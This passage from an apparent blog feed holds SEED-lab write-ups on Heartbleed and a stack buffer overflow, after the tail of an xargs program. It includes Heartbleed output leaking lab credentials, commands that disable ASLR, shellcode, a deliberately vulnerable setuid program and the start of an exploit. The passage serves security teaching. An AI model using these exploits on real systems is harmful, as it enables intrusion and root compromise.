class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/fs.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/param.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDIN 0</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1024</span>];<br>    <span class="hljs-keyword">char</span> c;<br>    <span class="hljs-keyword">char</span> *Argv[MAXARG];<br>    <span class="hljs-keyword">int</span> index=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;=argc<span class="hljs-number">-1</span>;i++)<br>    &#123;<br>        Argv[i<span class="hljs-number">-1</span>]=argv[i];<span class="hljs-comment">//ignore xargs(argv[0])</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>    &#123;<br>        index=<span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(buf));<br>        <span class="hljs-keyword">char</span> *p=buf;<br>        i=argc<span class="hljs-number">-1</span>;<span class="hljs-comment">//注意i要写在这里</span><br>        <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>        &#123;<br>            <span class="hljs-keyword">int</span> num=read(STDIN,&amp;c,<span class="hljs-number">1</span>);<span class="hljs-comment">//读取标准输入,注意是&amp;c</span><br>            <span class="hljs-keyword">if</span>(num!=<span class="hljs-number">1</span>)<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">//程序的终止条件</span><br>            <span class="hljs-keyword">if</span>(c==<span class="hljs-string">&#x27; &#x27;</span>||c==<span class="hljs-string">&#x27;\n&#x27;</span>)<br>            &#123;<br>                buf[index++]=<span class="hljs-string">&#x27;\0&#x27;</span>;<br>                Argv[i++]=p;<span class="hljs-comment">//参数</span><br>                p=&amp;buf[index];<span class="hljs-comment">//更新参数首地址</span><br>                <span class="hljs-keyword">if</span>(c==<span class="hljs-string">&#x27;\n&#x27;</span>) <br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-comment">//character </span><br>            &#123;<br>                buf[index++]=c;<br>            &#125;<br>        &#125;<br>        Argv[i]=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> pid = fork();<br>        <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)<br>        &#123;<br>            exec(Argv[<span class="hljs-number">0</span>],Argv);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            wait(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230301002218.png"></p>]]></content>
    
    
    <categories>
      
      <category>MIT6S081</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-lab：Heartbleed Attack Lab</title>
    <link href="/p/cd441a20/"/>
    <url>/p/cd441a20/</url>
    
    <content type="html"><![CDATA[<h1 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h1><p>设置两个 VM: </p><ul><li>攻击者机器<ul><li>修改/etc/hosts 文件将服务器名映射到服务器 VM 的 IP 地址，在/etc/hosts 中搜索<code>127.0.0.1   www.heartbleedlabelgg.com</code>，将承载ELGG应用程序的服务器VM的实际IP地址替换掉127.0.0.1</li></ul></li><li>受害者服务器</li></ul><h1 id="Heartbleed漏洞分析"><a href="#Heartbleed漏洞分析" class="headerlink" title="Heartbleed漏洞分析"></a>Heartbleed漏洞分析</h1><p>OpenSSL 库中的一个漏洞，受影响的 OpenSSL 版本范围从1.0.1到1.0.1 f，在一些新版本的OpenSSL中无法复现</p><p>心跳协议是如何工作的。心跳协议由两种消息类型组成: HeartbeatRequest 包和 HeartbeatResponse 包。客户端向服务器发送一个 HeartbeatRequest 数据包。当服务器接收到它时，它会发回 HeartbeatResponse 数据包中接收到的消息的副本。目标是保持连接活跃</p><p>心脏出血攻击是基于心跳请求的。这个请求只是向服务器发送一些数据，服务器将把这些数据复制到它的响应数据包中，这样所有的数据都会得到回显</p><p><strong>在正常情况下，假设请求包含3个字节的数据“ ABC”，因此长度字段的值为3。服务器将把数据放在内存中，并从数据的开头复制3个字节到它的响应数据包。在攻击场景中，请求可能包含3个字节的数据，但长度字段可能是1003。当服务器构造它的响应数据包时，它从数据的开始进行复制(即“ ABC”) ，但是它复制的是1003个字节，而不是3个字节。这额外的1000种类型显然不是来自请求数据包; 它们来自服务器的私有内存，并且它们可能包含其他用户的信息、密钥和密码</strong></p><h1 id="Task-1-Launch-the-Heartbleed-Attack"><a href="#Task-1-Launch-the-Heartbleed-Attack" class="headerlink" title="Task 1: Launch the Heartbleed Attack"></a>Task 1: Launch the Heartbleed Attack</h1><p>攻击步骤：</p><ul><li><p>访问 <a href="https://www.heartbleedlabelgg.com/">https://www.heartbleedlabelgg.com</a></p></li><li><p>以管理员身份登录：admin ：seedelgg</p></li><li><p>添加boby为friend，并给他发送私人信息</p></li></ul><p>多次运行攻击的回显如下</p><p>可以看出泄露了cookie、username、密码等关键信息</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs clean"># ./attack.py www.heartbleedlabelgg.com<br><br>defribulator v1<span class="hljs-number">.20</span><br>A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE<span class="hljs-number">-2014</span><span class="hljs-number">-0160</span>)<br><br>##################################################################<br>Connecting to: www.heartbleedlabelgg.com:<span class="hljs-number">443</span>, <span class="hljs-number">1</span> times<br>Sending Client Hello for TLSv1<span class="hljs-number">.0</span><br>Analyze the result....<br>Analyze the result....<br>Analyze the result....<br>Analyze the result....<br>Received Server Hello for TLSv1<span class="hljs-number">.0</span><br>Analyze the result....<br><br>WARNING: www.heartbleedlabelgg.com:<span class="hljs-number">443</span> returned more data than it should - server is vulnerable!<br>Please wait... connection attempt <span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span><br>##################################################################<br><br>.@.AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...<br>...!<span class="hljs-number">.9</span><span class="hljs-number">.8</span>........<span class="hljs-number">.5</span>...............<br>........<span class="hljs-number">.3</span><span class="hljs-number">.2</span>.....E.D...../...A.................................I.........<br>...........<br>...................................#.......-US,en;q=<span class="hljs-number">0.5</span><br>Accept-Encoding: gzip, deflate<br>Referer: https:<span class="hljs-comment">//www.heartbleedlabelgg.com/profile/boby</span><br>Cookie: Elgg=vt3bsst6tb3ov6njhj7kcijn42<br>Connection: keep-alive<br>If-None-Match: <span class="hljs-string">&quot;1449721729&quot;</span><br><br>..*.......a<span class="hljs-number">.3</span>v.O.akf.........b3ov6njhj7kcijn42<br>Connection: keep-alive<br><br>_..@?.<br>.<span class="hljs-number">.2</span>....&#123; d..................=<span class="hljs-number">1670072367</span>&amp;username=admin&amp;password=seedlggT.;<span class="hljs-number">.8</span>A.K..VY.<span class="hljs-string">&quot;....&quot;</span><br><br></code></pre></td></tr></table></figure><h1 id="Task-2-Find-the-Cause-of-the-Heartbleed-Vulnerability"><a href="#Task-2-Find-the-Cause-of-the-Heartbleed-Vulnerability" class="headerlink" title="Task 2: Find the Cause of the Heartbleed Vulnerability"></a>Task 2: Find the Cause of the Heartbleed Vulnerability</h1><p>比较良性数据包和攻击者代码发送的恶意数据包的结果，以找出心脏出血漏洞的根本原因</p><blockquote><p>当 Heartbeat 请求数据包到来时，服务器将解析数据包以获得有效负载和有效负载长度值(如图1所示)。这里，有效负载只是一个3字节的字符串“ ABC”，有效负载长度值正好是3。服务器程序将盲目地从请求数据包中获取这个长度值。然后，它通过指向存储“ ABC”的内存并将负载长度字节复制到响应负载来构建响应数据包。这样，响应数据包将包含一个3字节的字符串“ ABC”。我们可以启动 HeartBleed 攻击，将有效负载长度字段设置为1003。在构建响应数据包时，服务器将再次盲目地采用这个 Payload 长度值。这一次，服务器程序将指向字符串“ ABC”，并将1003字节作为有效负载从内存复制到响应数据包。除了字符串“ ABC”之外，额外的1000字节被复制到响应数据包中，这些数据包可以是内存中的任何内容，比如机密活动、日志信息、密码等等</p></blockquote><p>图示：</p><p><img src="https://raw.githubusercontent.com/LaPhilosophie/seedlab/main/Heartbleed%20Attack%20Lab/image/The%20Heartbleed%20Attack%20Communication.png"></p><p>​             </p><p><img src="https://raw.githubusercontent.com/LaPhilosophie/seedlab/main/Heartbleed%20Attack%20Lab/image/The%20Benign%20Heartbeat%20Communication.png"></p><p>通过命令行参数控制有效载荷长度值，该参数默认是0x4000</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$./attack<span class="hljs-selector-class">.py</span> www<span class="hljs-selector-class">.heartbleedlabelgg</span><span class="hljs-selector-class">.com</span> -l <span class="hljs-number">0</span>x015B<br>$./attack<span class="hljs-selector-class">.py</span> www<span class="hljs-selector-class">.heartbleedlabelgg</span><span class="hljs-selector-class">.com</span> --length <span class="hljs-number">83</span><br></code></pre></td></tr></table></figure><p>Question 2.1: As the length variable decreases, what kind of difference can you observe?</p><p>回返的信息长度减少</p><p>Question 2.2: As the length variable decreases, there is a boundary value for the input length vari-<br>able. At or below that boundary, the Heartbeat query will receive a response packet without attaching<br>any extra data (which means the request is benign). Please find that boundary length. You may need<br>to try many different length values until the web server sends back the reply without extra data. To<br>help you with this, when the number of returned bytes is smaller than the expected length, the pro-<br>gram will print “Server processed malformed Heartbeat, but did not return<br>any extra data.”</p><p>边界值：22</p><p>回显形式1：</p><blockquote><p>WARNING: <a href="http://www.heartbleedlabelgg.com:443/">www.heartbleedlabelgg.com:443</a> returned more data than it should - server is vulnerable!</p></blockquote><p>回显形式2：</p><blockquote><p>Server processed malformed heartbeat, but did not return any extra data.</p></blockquote><h1 id="Task-3-Countermeasure-and-Bug-Fix"><a href="#Task-3-Countermeasure-and-Bug-Fix" class="headerlink" title="Task 3: Countermeasure and Bug Fix"></a>Task 3: Countermeasure and Bug Fix</h1><p>使用<code>sudo apt-get update</code>将 OpenSSL 库更新到最新版本，发现之后的攻击无效</p><p>Heartbeat request/response 包格式如下：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    HeartbeatMessageType type; <span class="hljs-comment">// 1 byte: request or the response</span><br>    uint16 payload_length; <span class="hljs-comment">// 2 byte: the length of the payload</span><br>    opaque payload[HeartbeatMessage.payload_length];<br>    opaque padding[padding_length];<br>&#125; HeartbeatMessage;<br></code></pre></td></tr></table></figure><ul><li><p>type是类型信息</p></li><li><p>payload_length是有效负载长度</p></li><li><p>payload是实际的有效负载</p></li><li><p>填充字段</p></li></ul><blockquote><p>有效负载的大小应该与有效负载长度字段中的值相同，但是在攻击场景中，有效负载长度可以设置为不同的值</p></blockquote><p>导致bug的语句是<code>memcpy(bp, pl, payload); </code>，其中，bp指向buffer，pl指向payload，它会将payload长度的内容从pl复制到bp（正如Alice所说），而这并没有做边界检查</p><p>在memcpy之前加上以下语句以修订：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">payload = payload_length &gt; <span class="hljs-built_in">strlen</span>(pl) ? <span class="hljs-built_in">strlen</span>(pl) : payload_length ;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-lab：Buffer-Overflow Attack Lab （16.04虚拟机）</title>
    <link href="/p/187136b6/"/>
    <url>/p/187136b6/</url>
    
    <content type="html"><![CDATA[<h1 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h1><p>Linux有两个防御机制：</p><ul><li>/bin/sh符号链接指向的是/bin/dash，dash和bash都有防御机制，当它们发现自己是在setuid进程中被执行的时候，就会euid为进程的真实用户id，放弃特权</li><li>地址空间随机化：Linux 使用地址空间随机化来随机化堆和堆栈的起始地址</li></ul><p>为了正常进行实验，需要：</p><ul><li>关闭地址空间随机化</li><li>将/bin/sh符号链接指向没有保护的shell，比如zsh</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo ln -sf <span class="hljs-regexp">/bin/</span>zsh <span class="hljs-regexp">/bin/</span>sh<br><br>sudo sysctl -w kernel.randomize_va_space=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>shellcode：</p><ul><li>shellcode本质是启动shell的代码，一般是二进制形式</li><li>需要被装载到内存中从而可以使得恶意程序跳转到shellcode代码所在位置</li></ul><p>C语言版本的shellcode：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> *name[<span class="hljs-number">2</span>];<br>    name[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>    name[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br>    execve(name[<span class="hljs-number">0</span>], name, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>上述程序对应的二进制形式被写在了code数组中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* call_shellcode.c  */</span><br><br><span class="hljs-comment">/*A program that creates a file containing code for launching shell*/</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> code[] =<br>  <span class="hljs-string">&quot;\x31\xc0&quot;</span>             <span class="hljs-comment">/* xorl    %eax,%eax              */</span><br>  <span class="hljs-string">&quot;\x50&quot;</span>                 <span class="hljs-comment">/* pushl   %eax                   */</span><br>  <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;//sh&quot;</span>           <span class="hljs-comment">/* pushl   $0x68732f2f            */</span><br>  <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;/bin&quot;</span>           <span class="hljs-comment">/* pushl   $0x6e69622f            */</span><br>  <span class="hljs-string">&quot;\x89\xe3&quot;</span>             <span class="hljs-comment">/* movl    %esp,%ebx              */</span><br>  <span class="hljs-string">&quot;\x50&quot;</span>                 <span class="hljs-comment">/* pushl   %eax                   */</span><br>  <span class="hljs-string">&quot;\x53&quot;</span>                 <span class="hljs-comment">/* pushl   %ebx                   */</span><br>  <span class="hljs-string">&quot;\x89\xe1&quot;</span>             <span class="hljs-comment">/* movl    %esp,%ecx              */</span><br>  <span class="hljs-string">&quot;\x99&quot;</span>                 <span class="hljs-comment">/* cdq                            */</span><br>  <span class="hljs-string">&quot;\xb0\x0b&quot;</span>             <span class="hljs-comment">/* movb    $0x0b,%al              */</span><br>  <span class="hljs-string">&quot;\xcd\x80&quot;</span>             <span class="hljs-comment">/* int     $0x80                  */</span><br>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>   <span class="hljs-keyword">char</span> buf[<span class="hljs-keyword">sizeof</span>(code)];<br>   <span class="hljs-built_in">strcpy</span>(buf, code);<br>   ((<span class="hljs-keyword">void</span>(*)( ))buf)( );<br>&#125; <br></code></pre></td></tr></table></figure><p>这里解释一下<code> ((void(*)( ))buf)( );</code></p><p>对于这种复杂指针问题，我们祭出小学五年级学过的<code>右左法则</code>：</p><ul><li>先看最里面的括号，再看右边，再看左边</li><li>每当你遇到括号，你应该改变你的阅读方向</li><li>解析完括号内的所有内容后，跳出括号</li><li>重复此过程，直到解决整个语句</li></ul><blockquote><p>Right-Left Rule: First look at the innermost parenthesis, then look to the right, and then to the left. Whenever you encounter parentheses, you should switch your reading direction. Once you have parsed everything inside the parentheses, jump out of the parentheses. Repeat this process until the entire statement is resolved.</p><p>reference：<a href="https://blog.karatos.in/a?ID=00250-f7e0610c-459c-431a-a3ab-d9a50a7d5598">https://blog.karatos.in/a?ID=00250-f7e0610c-459c-431a-a3ab-d9a50a7d5598</a></p></blockquote><p>因此最里面的内容可以提取为：<code>void(*)( )</code>，也即是<code>void(* foo)( )</code></p><p>foo一个指向函数的指针，返回值是void类型</p><p>之后向外看，buf被强转为上面的指针类型，这里进行了调用，也即是执行了二进制代码</p><p>再解释一下为什么将“//sh”而不是“/sh”推入堆栈。这是因为我们需要32 bit，而“/sh”只有24位，要注意到“//”等效于“/”，不信你可以试试在命令行敲入<code>/bin//sh</code>也是可以开启shell进程的</p><p>使用call_shellcode.c得到root shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo ln -sf /bin/zsh /bin/sh<br><br>gcc -z execstack -o call_shellcode call_shellcode.c<br><br>sudo chown root call_shellcode<br><br>sudo chmod 4755 call_shellcode<br><br>./call_shellcode<br></code></pre></td></tr></table></figure><h1 id="The-Vulnerable-Program"><a href="#The-Vulnerable-Program" class="headerlink" title="The Vulnerable Program"></a>The Vulnerable Program</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Vunlerable program: stack.c */</span><br><span class="hljs-comment">/* You can get this program from the lab&#x27;s website */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-comment">/* Changing this size will change the layout of the stack.</span><br><span class="hljs-comment"> * Instructors can change this value each year, so students</span><br><span class="hljs-comment"> * won&#x27;t be able to use the solutions from the past.</span><br><span class="hljs-comment"> * Suggested value: between 0 and 400  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> BUF_SIZE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUF_SIZE 24</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bof</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buffer[BUF_SIZE];<br><br>    <span class="hljs-comment">/* The following statement has a buffer overflow problem */</span><br>    <span class="hljs-built_in">strcpy</span>(buffer, str);       <br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> str[<span class="hljs-number">517</span>];<br>    FILE *badfile;<br><br>     <span class="hljs-comment">/* Change the size of the dummy array to randomize the parameters</span><br><span class="hljs-comment">       for this lab. Need to use the array at least once */</span><br>    <span class="hljs-keyword">char</span> dummy[BUF_SIZE];  <span class="hljs-built_in">memset</span>(dummy, <span class="hljs-number">0</span>, BUF_SIZE);<br><br>    badfile = fopen(<span class="hljs-string">&quot;badfile&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    fread(str, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-number">517</span>, badfile);<br>    bof(str);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Returned Properly\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>攻击面：</strong></p><p>该程序从一个名为 badfile 的文件中读取一个输入，然后将该输入传递给函数 bof ()中的另一个缓冲区。原始输入的最大长度可以是517字节，但是 bof ()中的缓冲区只有 BUF SIZE 字节，也即是24长，小于517。因为 strcpy ()不检查边界，所以会发生缓冲区溢出。由于这个程序是一个 root 用户拥有的 Set-UID 程序，如果普通用户可以利用这个缓冲区溢出漏洞，那么用户可能会得到一个 root shell。应该注意的是，程序从一个名为 badfile 的文件中获取输入。此文件由用户控制。现在，我们的目标是为 badfile 创建内容，这样当易受攻击的程序将内容复制到其缓冲区时，就可以产生一个root shell。</p><p><strong>编译：</strong></p><ul><li><p>首先将程序的所有权更改为 root</p></li><li><p>然后将权限更改为4755以启用 Set-UID </p></li><li><p>更改所有权必须在打开 Set-UID 位之前完成，因为所有权更改将导致关闭 Set-UID 位</p></li><li><p>使用-fno-stack-protected 和“-z Execstack”选项关闭 StackGuard 和非可执行堆栈保护</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// Note: N should be replaced by the value set by the instructor</span><br>$ gcc -g -o stack -z execstack -fno-stack-protector stack.c<br>$ sudo chown root stack <br>$ sudo chmod <span class="hljs-number">4755</span> stack <br></code></pre></td></tr></table></figure><h1 id="Task-2-Exploiting-the-Vulnerability"><a href="#Task-2-Exploiting-the-Vulnerability" class="headerlink" title="Task 2: Exploiting the Vulnerability"></a>Task 2: Exploiting the Vulnerability</h1><p>我们需要编写exploit.c，该代码可以填写badfile的内容从而引发攻击。为了发起攻击，我们需要使用gdb调试stack文件</p><p>编译stack.c：</p><ul><li><p>在上面编译选项的基础上加上-g选项，编译stack.c，也即是<code>gcc -g -o stack -z execstack -fno-stack-protector stack.c</code>，这里可以使用-DBUF_SIZE=N选项手动指定缓冲区的大小</p></li><li><p>将stack更改为root所有的setuid文件</p></li></ul><p>使用gdb去调试stack文件：</p><ul><li>b bof，在bof下断点</li><li>x/16xw buffer观察buffer地址以及其内容</li><li>p $ebp打印出栈指针的值</li><li>$ebp+4就是返回地址</li></ul><p>通过gdb调试发现：</p><ul><li>buffer地址为：0xbfffeb18</li><li>ebp地址为：0xbfffeb38</li><li><code>p/d $ebp-0xffffcf84=32</code>，也即是说，ebp在buffer上面32字节的位置</li><li>返回地址为buffer上面36字节的位置</li></ul><p><img src="/image/20221124205928.png"></p><p>exploit.c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* exploit.c  */</span><br><br><span class="hljs-comment">/* A program that creates a file containing code for launching shell*/</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">char</span> shellcode[]=<br>    <span class="hljs-string">&quot;\x31\xc0&quot;</span>             <span class="hljs-comment">/* xorl    %eax,%eax              */</span><br>    <span class="hljs-string">&quot;\x50&quot;</span>                 <span class="hljs-comment">/* pushl   %eax                   */</span><br>    <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;//sh&quot;</span>           <span class="hljs-comment">/* pushl   $0x68732f2f            */</span><br>    <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;/bin&quot;</span>           <span class="hljs-comment">/* pushl   $0x6e69622f            */</span><br>    <span class="hljs-string">&quot;\x89\xe3&quot;</span>             <span class="hljs-comment">/* movl    %esp,%ebx              */</span><br>    <span class="hljs-string">&quot;\x50&quot;</span>                 <span class="hljs-comment">/* pushl   %eax                   */</span><br>    <span class="hljs-string">&quot;\x53&quot;</span>                 <span class="hljs-comment">/* pushl   